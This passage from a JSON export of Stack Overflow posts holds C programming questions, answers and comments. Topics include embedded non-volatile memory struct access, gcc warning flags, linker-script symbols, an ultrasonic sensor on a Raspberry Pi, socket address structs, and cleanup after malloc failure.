simple:</p>\n\n<pre><code>int32_t ReadInt32(ID_T id);\nfloat ReadFloat(ID_T id);\nvoid WriteInt32(ID_T id, int32_t value);\nvoid WriteFloat(ID_T id, float value);\n</code></pre>\n\n<p>There are several advantages to this:</p>\n\n<ul>\n<li>All dirty details of offsets and addresses are hidden from other code.</li>\n<li>Now you can easily extend this, add for example min/max/description fields. </li>\n<li>You can easily change to format of the data tables by changing the script, while your API stays the same.</li>\n<li>If you later need additional features, like ability to read/write settings through serial port, settings are listed in one place.</li>\n<li>If you add additional field for pointer to data, you can update the actual RAM value automatically, when you call write functions.</li>\n<li>You can create other script to generate documentation (pdf/doc/etc.) of the settings</li>\n</ul>\n"}], "owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "closed_date": 1476306838, "accepted_answer_id": 40000306, "answer_count": 1, "score": 1, "last_activity_date": 1476282388, "creation_date": 1476275834, "last_edit_date": 1476282388, "question_id": 39998805, "link": "https://stackoverflow.com/questions/39998805/common-interface-pattern-for-writing-struct-members-to-memory", "closed_reason": "Opinion-based", "title": "Common interface pattern for writing struct members to memory?", "body": "<p>I am working with an embedded device (no OS) that has some external non-volatile memory.</p>\n\n<p>I am storing multiple copies of a single struct's data in the NV memory. I read and write to the data in memory as whole structs <strong>and</strong> as individual members.</p>\n\n<p>Currently I have a working implementation. When the module that deals with the memory operations gets initialised it is given the location of the struct that is in RAM, which it stores as part of its context. This means that when it comes to read and write single <em>members</em> it can calculate the offset of the member by subtracting the previously mentioned location from the member's location. Then it uses this offset to know where to find the copy in the NV memory.</p>\n\n<p>e.g. in psuedo-code:</p>\n\n<pre><code>init:\n    wm_ram = pointer to working memory struct start in RAM;\n\nwrite to a member from the member in RAM:\n    offset = working memory member location in RAM - wm_ram;\n    sector address = address of selected copy of struct in NV to write to;\n    write data from working memory member location to NV sector @ start + \n        offset + sector address;\n</code></pre>\n\n<p>(The struct type has several nested structs, so I think offsetof() is out here)</p>\n\n<p>This results in a pretty simple and familiar feeling function signature for the common operations:</p>\n\n<pre><code>int write_or_read(*handle, copyNumber, *data, size);\n</code></pre>\n\n<p>This is fine until I want to also store a second struct from RAM. This means there are now two addresses in RAM that the memory module needs to keep track of to correctly calculate offsets, plus some added decision work to decide which to use</p>\n\n<p>Thus I reasoned that the struct RAM start location should be passed in at the time of the memory operations rather than being held as part of the memory module's context.</p>\n\n<p>This starts to get a bit ungainly though:</p>\n\n<pre><code>int write_or_read(*handle, copyNumber, *data, *data_struct_start, size);\n</code></pre>\n\n<p>And so my question is: is there any convention or pattern that is often or commonly used for similar or analogous cases, hopefully such that would also result in simple and familiar operation function signatures?</p>\n\n<p><strong>EDIT: for further explanation</strong>\nThe NV memory is a simple external device, similar to an EEPROM, with 2KB of memory. My structs contain multiple data types including other structs and total  around 600B in size each. The device does not have buffering; it's actually FRAM, so it's fairly fast, but I have little overhead so I'd like not to have to write the whole struct for just one member.</p>\n\n<p>The picture shows that I currently have a struct in RAM with multiple copies in NV memory. If I want to read or write to a specific member of a specific copy then I have the address of the member in RAM by simply taking the address of the member (<code>&amp;myStruct-&gt;member_2</code>) but what address should I use in NV? the RAM address don't line up with the addresses in NV (e.g. address 0x300 in RAM != 0x300 in NV) so I need some other way of determining that.</p>\n\n<p><a href=\"https://i.stack.imgur.com/veoXw.png\" rel=\"nofollow\"><img src=\"https://i.stack.imgur.com/veoXw.png\" alt=\"enter image description here\"></a>. </p>\n\n<p>If a read or write function is told to write a copy of <code>member_2</code> of <code>myStruct</code> to struct_1 in NV then what byte address does it need to write to?</p>\n\n<p>Maybe I'm incorrect in trying to keep the interface this simple?</p>\n"}, {"tags": ["c", "gcc", "warnings"], "comments": [{"owner": {"reputation": 1473, "user_id": 6517894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0511b1daef16fed51233f70c4370dafc?s=128&d=identicon&r=PG&f=1", "display_name": "Realtime Rik", "link": "https://stackoverflow.com/users/6517894/realtime-rik"}, "edited": false, "score": 2, "creation_date": 1476276658, "post_id": 39998786, "comment_id": 67275806, "body": "Personally I would switch pedantic on and fix all the warnings. It&#39;s there for a reason!"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1476284137, "post_id": 39998786, "comment_id": 67281357, "body": "try &quot;signed char&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 5092, "user_id": 5481471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf6efc50461d3521db348bf483652040?s=128&d=identicon&r=PG&f=1", "display_name": "G. Sliepen", "link": "https://stackoverflow.com/users/5481471/g-sliepen"}, "edited": false, "score": 0, "creation_date": 1476281634, "post_id": 39998940, "comment_id": 67279518, "body": "It&#39;s weird that with <code>-pedantic</code>, gcc says <code>warning: overflow in implicit constant conversion [-Woverflow]</code>, but <code>-Woverflow</code> does nothing, but as you suggested, <code>-Wconversion</code> does seem to work in this case."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 5092, "user_id": 5481471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf6efc50461d3521db348bf483652040?s=128&d=identicon&r=PG&f=1", "display_name": "G. Sliepen", "link": "https://stackoverflow.com/users/5481471/g-sliepen"}, "edited": false, "score": 0, "creation_date": 1476289535, "post_id": 39998940, "comment_id": 67285162, "body": "@G.Sliepen <code>but -Woverflow does nothing </code> It happens because without optimisation the compiler doesn&#39;t do the necessary analysis to realise that in the multiplication expression it knows the values."}, {"owner": {"reputation": 930, "user_id": 4511056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75bb6c2868ac49ca03c83544133f34b3?s=128&d=identicon&r=PG&f=1", "display_name": "Secto Kia", "link": "https://stackoverflow.com/users/4511056/secto-kia"}, "edited": false, "score": 0, "creation_date": 1476317019, "post_id": 39998940, "comment_id": 67298486, "body": "Yes I was looking for the warning of &quot;overflow in implicit constant conversion&quot;."}], "tags": [], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "is_accepted": true, "score": 2, "last_activity_date": 1476276868, "last_edit_date": 1476276868, "creation_date": 1476276282, "answer_id": 39998940, "question_id": 39998786, "link": "https://stackoverflow.com/questions/39998786/enable-gcc-warning-for-literal-char-overflow/39998940#39998940", "title": "Enable gcc warning for literal char overflow", "body": "<p>I'm not sure if there is another <code>FLAG</code>, if you don't wanna use <code>-pedantic/-Wpedantic</code>, you can try something like this:</p>\n\n<pre><code>error: conversion to \u2018char\u2019 alters \u2018int\u2019 constant value [-Werror=conversion]\n char x = 0xff;\n          ^\n</code></pre>\n\n<p>if yes, then do:</p>\n\n<pre><code>gcc -Wconversion\n</code></pre>\n"}], "owner": {"reputation": 930, "user_id": 4511056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75bb6c2868ac49ca03c83544133f34b3?s=128&d=identicon&r=PG&f=1", "display_name": "Secto Kia", "link": "https://stackoverflow.com/users/4511056/secto-kia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "accepted_answer_id": 39998940, "answer_count": 1, "score": 2, "last_activity_date": 1476276868, "creation_date": 1476275778, "question_id": 39998786, "link": "https://stackoverflow.com/questions/39998786/enable-gcc-warning-for-literal-char-overflow", "title": "Enable gcc warning for literal char overflow", "body": "<p>In gcc even with <code>-Wall</code> on, I get no warning for: <code>char x = 0xff;</code></p>\n\n<p>However with <code>-pedantic</code> I do.</p>\n\n<p>Is there a way to turn on this warning, without using pedantic and getting other pedantic warnings?</p>\n"}, {"tags": ["c", "gcc", "ld"], "answers": [{"comments": [{"owner": {"reputation": 329, "user_id": 1648890, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/7fd5f54bc763f5490961cd8cfa2d31bf?s=128&d=identicon&r=PG", "display_name": "Ahmed Adel", "link": "https://stackoverflow.com/users/1648890/ahmed-adel"}, "edited": false, "score": 0, "creation_date": 1599662028, "post_id": 44086338, "comment_id": 112843307, "body": "I am little bit confused about using the &amp; operator rather than * operator. Knowing that linker script variables are just symbols whose values represent memory addresses, then I expect that *foo = 5 means: write 5 to the memory location foo. I don&#39;t get the sense of &amp;foo = 5. Any help ?"}], "tags": [], "owner": {"reputation": 2224, "user_id": 1721424, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/215f7e243f29cacab4e533dad1bf1f67?s=128&d=identicon&r=PG", "display_name": "Ryan", "link": "https://stackoverflow.com/users/1721424/ryan"}, "is_accepted": true, "score": 10, "last_activity_date": 1495328463, "last_edit_date": 1495328463, "creation_date": 1495286158, "answer_id": 44086338, "question_id": 39998485, "link": "https://stackoverflow.com/questions/39998485/how-to-access-variable-define-in-linker-script-in-c/44086338#44086338", "title": "How to access variable define in linker script in c?", "body": "<p>You need to take the address of the <code>extern</code> variable. It is not completely intuitive but is explained in <a href=\"https://sourceware.org/binutils/docs/ld/Source-Code-Reference.html\" rel=\"noreferrer\">the manual</a>.</p>\n\n<p>In theory, the <code>extern</code> can be any primitive data type. For reasons which I am unaware, the convention is to use a <code>char</code>:</p>\n\n<pre><code>extern char __KERNEL_BEGIN__;\n</code></pre>\n\n<p>Then to get the address exported from the linker script, take the address of <code>__KERNEL_BEGIN__</code>:</p>\n\n<pre><code>printf(\"Address: %08x\\n\", &amp;__KERNEL_BEGIN__);\n</code></pre>\n\n<p>You can read about this in <a href=\"https://sourceware.org/binutils/docs/ld/Source-Code-Reference.html\" rel=\"noreferrer\">the manual for <code>ld</code></a>.</p>\n"}, {"tags": [], "owner": {"reputation": 300, "user_id": 9006042, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-H89sdWGVcvo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfsy8AW6vi4sg-_okfPypDZm-SnVA/mo/photo.jpg?sz=128", "display_name": "Tyrel Kostyk", "link": "https://stackoverflow.com/users/9006042/tyrel-kostyk"}, "is_accepted": false, "score": 0, "last_activity_date": 1602193416, "creation_date": 1602193416, "answer_id": 64271049, "question_id": 39998485, "link": "https://stackoverflow.com/questions/39998485/how-to-access-variable-define-in-linker-script-in-c/64271049#64271049", "title": "How to access variable define in linker script in c?", "body": "<p>This is more in reference to your follow-up question beneath Ryan's post, however it may help answer your original question as well.</p>\n<p>&quot;Variables&quot; defined in linker scripts aren't treated the same as those defined in C; they're more <em>symbols</em> than anything. When accessing these <em>symbols</em> defined in your linker scripts, you <strong>must</strong> use the &amp; operator.</p>\n<p>For example, if we had the following section in our linker script:</p>\n<pre><code>.data :\n{\n    _sdata = .;\n    *(.data*);\n    _edata = .;\n} &gt; ram AT &gt;rom\n</code></pre>\n<p>We could get a pointer to the start of the <code>.data</code> section like so:</p>\n<pre><code>uint8_t *data_ptr = &amp;_sdata;\n</code></pre>\n<p>For further reading, try <a href=\"https://sourceware.org/binutils/docs/ld/Source-Code-Reference.html\" rel=\"nofollow noreferrer\">the binutils docs</a>, or <a href=\"https://interrupt.memfault.com/blog/how-to-write-linker-scripts-for-firmware\" rel=\"nofollow noreferrer\">this excellent primer on linker scripts</a></p>\n<p>Cheers</p>\n"}], "owner": {"reputation": 340, "user_id": 5159891, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a718f7cb4a6342a2a9709eeeac2b04b8?s=128&d=identicon&r=PG&f=1", "display_name": "pete lin", "link": "https://stackoverflow.com/users/5159891/pete-lin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4977, "favorite_count": 1, "accepted_answer_id": 44086338, "answer_count": 2, "score": 5, "last_activity_date": 1602193416, "creation_date": 1476274850, "last_edit_date": 1495291070, "question_id": 39998485, "link": "https://stackoverflow.com/questions/39998485/how-to-access-variable-define-in-linker-script-in-c", "title": "How to access variable define in linker script in c?", "body": "<p>In the linker script, I defined <code>PROVIDE(__KERNEL_BEGIN__ = .);</code>.</p>\n\n<p>The address can be accessed from:</p>\n\n<pre><code>extern uint32_t __KERNEL_BEGIN__[];\n</code></pre>\n\n<p>But, the following does not work (gives an incorrect address):</p>\n\n<pre><code>extern uint32_t * __KERNEL_BEGIN__;\n</code></pre>\n\n<p>I looked at the assembly. The first method, <code>__KERNEL_BEGIN__</code>, provides the exact address. The second one, <code>__KERNEL_BEGIN__ = [address]</code>, looks up a value at the address.</p>\n\n<p>So, must it be this way? I cannot tell the difference.</p>\n"}, {"tags": ["c", "timer", "count", "raspberry-pi", "ping"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1476274531, "post_id": 39998247, "comment_id": 67274384, "body": "Which granularity do you need for time?"}, {"owner": {"reputation": 61, "user_id": 5558131, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/qO9Mq.jpg?s=128&g=1", "display_name": "Lisa Nielsen Bred", "link": "https://stackoverflow.com/users/5558131/lisa-nielsen-bred"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1476345570, "post_id": 39998247, "comment_id": 67307921, "body": "Do you mean like minuts and seconds and such? Then I need seconds and milliseconds."}], "answers": [{"comments": [{"owner": {"reputation": 61, "user_id": 5558131, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/qO9Mq.jpg?s=128&g=1", "display_name": "Lisa Nielsen Bred", "link": "https://stackoverflow.com/users/5558131/lisa-nielsen-bred"}, "edited": false, "score": 0, "creation_date": 1476345638, "post_id": 40004418, "comment_id": 67307964, "body": "I&#39;m not sure what you mean? I am getting the distance with my code? It works just fine for measuring distance"}], "tags": [], "owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "is_accepted": false, "score": 0, "last_activity_date": 1476291970, "creation_date": 1476291970, "answer_id": 40004418, "question_id": 39998247, "link": "https://stackoverflow.com/questions/39998247/ping-sensor-on-rpi-start-counting-when-less-than-40cm/40004418#40004418", "title": "PING sensor on RPI, start counting when less than 40cm?", "body": "<p>The code doesn't measure the distance. It only measures the duration of the reflected signal. To get the distance you need to measure the delay between the beginning of ping, and the beginning of echo:</p>\n\n<pre><code>    startTime = micros();\n\n    digitalWrite(TRIG, HIGH);\n    delayMicroseconds(20);\n    digitalWrite(TRIG, LOW);\n\n    //Wait for echo start\n    while(digitalRead(ECHO) == LOW);\n    long travelTime = micros() - startTime;\n</code></pre>\n\n<p>Of course, this is just a skeleton: you need to debounce the echo to guard yourself against background noises and other glitches.</p>\n"}], "owner": {"reputation": 61, "user_id": 5558131, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/qO9Mq.jpg?s=128&g=1", "display_name": "Lisa Nielsen Bred", "link": "https://stackoverflow.com/users/5558131/lisa-nielsen-bred"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476291970, "creation_date": 1476274139, "question_id": 39998247, "link": "https://stackoverflow.com/questions/39998247/ping-sensor-on-rpi-start-counting-when-less-than-40cm", "title": "PING sensor on RPI, start counting when less than 40cm?", "body": "<p>I have a PING sensor (HC-SR04) hooked up to my RPI. I want it to start counting when the sensor sees less than 40 cm. It should stop counting again when the sensor again sees less than 40 cm, print out the time and start counting again.\nHow can I do this?\nThis is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;wiringPi.h&gt;\n\n#define TRUE 1\n\n#define TRIG 5\n#define ECHO 6\n\nvoid setup() {\n    wiringPiSetup();\n    pinMode(TRIG, OUTPUT);\n    pinMode(ECHO, INPUT);\n\n    //TRIG pin must start LOW\n    digitalWrite(TRIG, LOW);\n    delay(30);\n}\n\nint getCM() {\n    //Send trig pulse\n    digitalWrite(TRIG, HIGH);\n    delayMicroseconds(20);\n    digitalWrite(TRIG, LOW);\n\n    //Wait for echo start\n    while(digitalRead(ECHO) == LOW);\n\n    //Wait for echo end\n    long startTime = micros();\n    while(digitalRead(ECHO) == HIGH);\n    long travelTime = micros() - startTime;\n\n    //Get distance in cm\n    int distance = travelTime / 58;\n\n    return distance;\n}\n\nint i;\n\nint main(void) {\n    setup();\n\n    while (1)\n    {\n            printf(\"Distance: %dcm\\n\", getCM());\n            delay(250);\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "edited": false, "score": 1, "creation_date": 1476274022, "post_id": 39998108, "comment_id": 67274066, "body": "abstraction there are quite a few variants of struct sockaddr_* and corresponding *_addr"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 2, "creation_date": 1476274112, "post_id": 39998108, "comment_id": 67274127, "body": "Take a look at <a href=\"http://stackoverflow.com/questions/13979150/why-is-sin-addr-inside-the-structure-in-addr\">this SO post</a>"}], "answers": [{"tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 0, "last_activity_date": 1476274236, "creation_date": 1476274236, "answer_id": 39998279, "question_id": 39998108, "link": "https://stackoverflow.com/questions/39998108/use-of-structure-with-one-field-only/39998279#39998279", "title": "use of structure with one field only", "body": "<p>Thats an abstraction layer. The rest of the code is written platform agnostic, and what exactly is in <code>struct in_addr</code> is presumably different on different platforms. This abstraction is done so the rest of the code <em>can be</em> platform agnostic.</p>\n"}], "owner": {"reputation": 11, "user_id": 6869412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae11dab90fcf98f94661eb7437cc0b24?s=128&d=identicon&r=PG&f=1", "display_name": "rjmrohit", "link": "https://stackoverflow.com/users/6869412/rjmrohit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "closed_date": 1476274302, "answer_count": 1, "score": 0, "last_activity_date": 1476274236, "creation_date": 1476273724, "question_id": 39998108, "link": "https://stackoverflow.com/questions/39998108/use-of-structure-with-one-field-only", "closed_reason": "Duplicate", "title": "use of structure with one field only", "body": "<p>I was studying about socket programming using C. In the header file netinet/in.h there is this code</p>\n\n<pre><code>struct in_addr\n{\n     in_addr_t s_addr;\n};\n</code></pre>\n\n<p>and this structure is used in the following structure.</p>\n\n<pre><code>struct sockaddr_in\n{\n      short   sin_family; /* must be AF_INET */\n      u_short sin_port;\n      struct  in_addr sin_addr;\n      char    sin_zero[8]; /* Not used, must be zero */\n};\n</code></pre>\n\n<p>What could be the reason of creating in_addr structure, while they could have just used it as a normal variable?</p>\n"}, {"tags": ["c", "arrays", "malloc", "free"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476272403, "post_id": 39997564, "comment_id": 67273092, "body": "You don&#39;t have a 2D array. That&#39;s a pointer-based look-up table. To allocate a 2D array, you have to use <code>int (*map)[number] = malloc(sizeof (int[number][number]));</code> or equivalent. The difference, namely that a 2D array has its data allocated in adjacent memory cells, is very important to understand."}, {"owner": {"reputation": 1733, "user_id": 5018637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa5267033b2b33f15648273cbe845534?s=128&d=identicon&r=PG&f=1", "display_name": "user464502", "link": "https://stackoverflow.com/users/5018637/user464502"}, "edited": false, "score": 0, "creation_date": 1476272638, "post_id": 39997564, "comment_id": 67273239, "body": "Don&#39;t forget to check the return value of the outer malloc."}, {"owner": {"reputation": 1211, "user_id": 4296075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a7d4f6a4e79ec582c89e67c45dea3e71?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/4296075/john-doe"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476274140, "post_id": 39997564, "comment_id": 67274145, "body": "@Lundin Oh i didn&#39;t know that, apart from the fact that the data is allocated differently are there any other differences in how to use them/speed?"}, {"owner": {"reputation": 1211, "user_id": 4296075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a7d4f6a4e79ec582c89e67c45dea3e71?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/4296075/john-doe"}, "reply_to_user": {"reputation": 1733, "user_id": 5018637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa5267033b2b33f15648273cbe845534?s=128&d=identicon&r=PG&f=1", "display_name": "user464502", "link": "https://stackoverflow.com/users/5018637/user464502"}, "edited": false, "score": 0, "creation_date": 1476274161, "post_id": 39997564, "comment_id": 67274166, "body": "@user464502 i had forgot that, fixed. Thanks"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1476285050, "post_id": 39997564, "comment_id": 67281986, "body": "@JohnSmith The only advantage of the method you use is that it allows each &quot;dimension&quot; of the look up table to get a different size than the others and change the size in run-time. The disadvantages are that your method leads to heap segmentation, much slower program due to cache misses and needlessly complex code that has potential for bugs and memory leaks. Also the actual allocation time is much slower with your code."}], "answers": [{"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": true, "score": 3, "last_activity_date": 1476276276, "last_edit_date": 1476276276, "creation_date": 1476272159, "answer_id": 39997610, "question_id": 39997564, "link": "https://stackoverflow.com/questions/39997564/c-freeing-2d-array-if-malloc-fail/39997610#39997610", "title": "C freeing 2D array if malloc fail", "body": "<p>You can use:</p>\n\n<pre><code>if (!(map[i])){\n    printf(\"Not enough memory!\\n\");\n\n    while (--i&gt;=0)\n        free(map[i]);\n\n    free(map);\n    return 1;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1211, "user_id": 4296075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a7d4f6a4e79ec582c89e67c45dea3e71?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/4296075/john-doe"}, "edited": false, "score": 0, "creation_date": 1476276403, "post_id": 39997614, "comment_id": 67275621, "body": "mh, is it still faster for really big maps which are accessed a lot or is it potentially slower in the long run since i have to calculate where my number is every time? If it&#39;s almost always faster i might actually use a solution similar to yours (i need to shave off as much time as i can from my program&#39;s execution)"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "reply_to_user": {"reputation": 1211, "user_id": 4296075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a7d4f6a4e79ec582c89e67c45dea3e71?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/4296075/john-doe"}, "edited": false, "score": 0, "creation_date": 1476277171, "post_id": 39997614, "comment_id": 67276160, "body": "@JohnSmith What? I didn&#39;t propose any different data structure, nothing to &quot;calculate where my number is&quot; whatever that means, all I offered was an alternative way of <i>allocating</i> the array of arrays. I&#39;m confused."}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 7, "last_activity_date": 1476272173, "creation_date": 1476272173, "answer_id": 39997614, "question_id": 39997564, "link": "https://stackoverflow.com/questions/39997564/c-freeing-2d-array-if-malloc-fail/39997614#39997614", "title": "C freeing 2D array if malloc fail", "body": "<p>Yes, you should <code>free()</code> otherwise you leak memory which might matter if this is in a long-running program.</p>\n\n<p>One way to make it easier is to compute the total size of all the allocations, and do a single larger <code>malloc()</code> rather than a whole bunch of smaller ones. This is also (potentially much) faster, since heap allocations can be expensive.</p>\n\n<p>That way, you only need to check once if it succeeded or failed, and there's nothing to <code>free()</code> in case of failure.</p>\n\n<p>Something like this:</p>\n\n<pre><code>int ** map_allocate(size_t number)\n{\n  int **base = malloc(number * sizeof (int *) + number * number * sizeof (int));\n  if(base != NULL)\n  {\n    int *row = (int *) (base + number);\n    for(size_t i = 0; i &lt; number; ++i)\n      base[i] = row + i * number;\n  }\n  return base;\n}\n</code></pre>\n\n<p>I didn't test-run this, but something along those lines.</p>\n"}, {"tags": [], "owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "is_accepted": false, "score": 1, "last_activity_date": 1476276536, "last_edit_date": 1476276536, "creation_date": 1476273280, "answer_id": 39997977, "question_id": 39997564, "link": "https://stackoverflow.com/questions/39997564/c-freeing-2d-array-if-malloc-fail/39997977#39997977", "title": "C freeing 2D array if malloc fail", "body": "<p>Always set pointers to null immediately you allocate them.</p>\n\n<pre><code>int **map;\n\nmap = malloc(number * sizeof(int *));\nif(!map)\n    goto out_of_memory;\nfor(i=0;i&lt;number;i++)\n    map[i] = 0;\n\nfor(i=0;i&lt;numbers;i++)\n{\n    map[i] = malloc(number * sizeof(int));\n    if(!map[i])\n        goto out_of_memory;\n}\n\n...\n\nreturn 0;\n\nout_of_memory:\n    if(map)\n        for(i=0;i&lt;number;i++)\n            free(map[i]);\n    free(map);\n    return -1;\n</code></pre>\n"}], "owner": {"reputation": 1211, "user_id": 4296075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a7d4f6a4e79ec582c89e67c45dea3e71?s=128&d=identicon&r=PG&f=1", "display_name": "John Doe", "link": "https://stackoverflow.com/users/4296075/john-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 540, "favorite_count": 0, "accepted_answer_id": 39997610, "answer_count": 3, "score": 3, "last_activity_date": 1476276536, "creation_date": 1476272026, "last_edit_date": 1476274058, "question_id": 39997564, "link": "https://stackoverflow.com/questions/39997564/c-freeing-2d-array-if-malloc-fail", "title": "C freeing 2D array if malloc fail", "body": "<p>If i have a 2D array allocated as follows:</p>\n\n<pre><code>int** map;\nmap = malloc(number * sizeof(int*));\nif(!(map)){\n    printf(\"out of memory!\\n\");\n    return 1;\n}\nfor (int i = 0; i &lt; number; i++){\n    map[i] = malloc(number * sizeof(int));\n    if (!(map[i])){\n        printf(\"Not enough memory!\\n\");\n        return 1;\n    }\n}\n</code></pre>\n\n<p>If the allocation fails and we enter in the if statement should i free map and the \"columns\" allocated until now? If so, how should i do it?</p>\n\n<p>Right now i just print the message and return 1 but i'm not sure if this is the correct approach.</p>\n"}, {"tags": ["c++", "c", 